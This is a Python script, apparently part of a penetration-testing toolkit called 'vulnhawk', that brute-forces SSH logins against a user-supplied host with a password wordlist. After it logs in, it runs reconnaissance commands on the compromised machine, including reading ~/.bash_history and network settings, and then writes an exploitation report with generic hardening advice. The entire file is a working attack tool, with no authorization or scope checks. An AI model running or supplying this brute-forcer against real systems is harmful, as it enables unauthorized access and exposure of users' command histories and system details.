import paramiko
from pwn import ssh
import os
import sys  # Import sys to handle exit
import time  # Import time for adding delays
import datetime

# Report class to gather and save the results
class Report:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.vulnerabilities = []
        self.exploitation_attempts = []

    def add_vulnerability(self, description):
        self.vulnerabilities.append(description)

    def add_exploitation_attempt(self, description, success):
        status = "Success" if success else "Failed"
        self.exploitation_attempts.append(f"{description} - {status}")

    def generate_report(self):
        report_content = f"""
        SSH Exploitation Report
        =======================
        
        Target IP: {self.target_ip}
        Date: {self.date}
        
        Summary of Findings:
        --------------------
        Vulnerabilities Identified: {len(self.vulnerabilities)}
        Exploitation Attempts Made: {len(self.exploitation_attempts)}
        
        Detailed Vulnerabilities:
        -------------------------
        """
        for idx, vuln in enumerate(self.vulnerabilities, 1):
            report_content += f"{idx}. {vuln}\n"

        report_content += "\nExploitation Attempts:\n----------------------\n"
        for idx, attempt in enumerate(self.exploitation_attempts, 1):
            report_content += f"{idx}. {attempt}\n"

        report_content += "\nRecommendations:\n-----------------\n"
        report_content += "1. Ensure strong, unique passwords are used for all accounts.\n"
        report_content += "2. Disable root login over SSH if not required.\n"
        report_content += "3. Regularly update the SSH server and associated libraries.\n"
        report_content += "4. Implement two-factor authentication for SSH access.\n"

        report_content += "\nConclusion:\n-----------\n"
        report_content += "Review the identified vulnerabilities and apply the recommended actions to enhance the security of your SSH configuration.\n"

        return report_content

    def save_report(self, filename="vulnhawk_ssh_report.txt"):
        report_content = self.generate_report()
        with open(filename, "w") as report_file:
            report_file.write(report_content)
        print(f"[+] Report saved as '{filename}'")

def execute_commands_on_victim(ssh_connection):
    try:
        print("\n[+] Checking current user...")
        current_user = ssh_connection['whoami']
        print(f"Current User: {current_user.decode()}")

        print("\n[+] Gathering system information...")
        system_info = ssh_connection['uname -a']
        print(f"System Info: {system_info.decode()}")

        print("\n[+] Checking hostname...")
        hostname = ssh_connection['hostname']
        print(f"Hostname: {hostname.decode()}")

        print("\n[+] Listing files in the home directory...")
        home_files = ssh_connection['ls -la ~']
        print(f"Home Directory Files:\n{home_files.decode()}")

        print("\n[+] Attempting to read .bash_history...")
        bash_history = ssh_connection['cat ~/.bash_history']
        print(f".bash_history:\n{bash_history.decode()}")

        print("\n[+] Checking network configuration...")
        network_info = ssh_connection['ifconfig']
        print(f"Network Info:\n{network_info.decode()}")

    except Exception as e:
        print(f"[!] An error occurred during command execution: {e}")

# Main function to handle the custom brute-force attack
def main():
    print("Starting Custom Brute Force Attack...")
    
    host = input("Enter the target host IP: ")
    username = input("Enter the target username: ")

    # Initialize report
    report = Report(target_ip=host)

    # Loop until a valid password file path is provided
    while True:
        password_file_path = input("Enter the path to your password file: ")
        
        if os.path.isfile(password_file_path):
            break
        else:
            print(f"[!] The file '{password_file_path}' does not exist. Please try again.")

    attempts = 0

    # Attempt to connect using each password from the user-provided list
    with open(password_file_path, "r") as password_list:
        for password in password_list:
            password = password.strip()
            print(f"Trying password: {password}")
            try:
                print(f"[{attempts}] Attempting Password: {password}")
                response = ssh(host=host, user=username, password=password, timeout=1)
                
                if response.connected:
                    print(f"[+] Connected with Password {password}")
                    report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", True)
                    execute_commands_on_victim(response)
                    break
                else:
                    report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", False)
            except paramiko.ssh_exception.AuthenticationException:
                print("Authentication failed.")
                report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", False)
            except Exception as e:
                print(f"An error occurred: {e}")
                report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", False)
            attempts += 1

    print("Custom Brute Force Attack Completed.")
    time.sleep(2)  # Adding delay to observe the output

    # Save the report
    report.save_report("vulnhawk_ssh_report.txt")
    
    end_or_return()  # Call the function to ask the user what to do next

def end_or_return():
    choice = input("\n[1] Return to Main Menu\n[0] Exit\nSelect an option: ")
    if choice == '1':
        from main import main_menu  # Import the main_menu function from main.py
        main_menu()
    elif choice == '0':
        sys.exit()
    else:
        print("[!] Invalid selection.")
        end_or_return()

if __name__ == "__main__":
    main()
